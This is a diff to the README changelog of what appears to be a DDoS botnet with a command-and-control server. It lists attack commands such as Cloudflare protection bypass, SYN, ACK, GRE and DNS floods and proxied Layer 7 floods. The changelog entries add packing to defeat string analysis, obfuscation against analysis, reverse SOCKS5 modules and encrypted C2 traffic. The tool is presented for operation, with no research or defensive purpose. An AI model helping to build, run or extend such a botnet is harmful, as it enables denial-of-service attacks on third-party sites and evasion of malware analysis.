@@ -247,9 +247,11 @@ Bots use a multi-method resolution system to find your C2 server:
 - `!cfbypass <url> <duration>` - Cloudflare UAM bypass attack
 - `!syn/!ack/!gre/!dns` - Protocol-specific attacks
   
-## 📋 Changelog
-
-### v3.4 - January 2026
+  ## 📋 Changelog
+  ### v1.5 - Febuary 2026
+  - ** deUPX(Binary Protector/Obfuscator) now called immeditealy after Build
+     > `Protects against Binary string analysis/grep`
+### v1.4 - January 2026
 - **BOT**: Added support for using Layer7 attacks behind proxy list
   > `!http target.com 443 60 -p https://example.com/proxies.txt`
 - **BOT**: Send total device RAM on registry
@@ -257,7 +259,7 @@ Bots use a multi-method resolution system to find your C2 server:
 - **CNC**: Updated New Eye Logo
 - **CNC**: Show Total Bot RAM tracked
 
-### v3.3 - January 2026
+### v1.3 - January 2026
 - Added `!stop` command - Instantly halt all running attacks
 - HTTPS/TLS 1.3 flood attack with HTTP/2 fingerprinting
 - Cloudflare UAM bypass attack
@@ -267,12 +269,12 @@ Bots use a multi-method resolution system to find your C2 server:
 - Fixed SOCKS5 proxy, target resolution, telnet handling
 - Anti-analysis obfuscation (meaningless function names)
 
-### v3.2 - January 2026
+### v1.2 - January 2026
 - Added Reverse Socks 5 Modules
 - Cleaned up CNC UI
 - Built Setup.py to automate setup process
 
-### v3.1 - December 2025
+### v1.1 - December 2025
 - Initial release with TLS 1.3 encrypted communications
 - 14 architecture cross-compilation support
 - HMAC challenge-response authentication
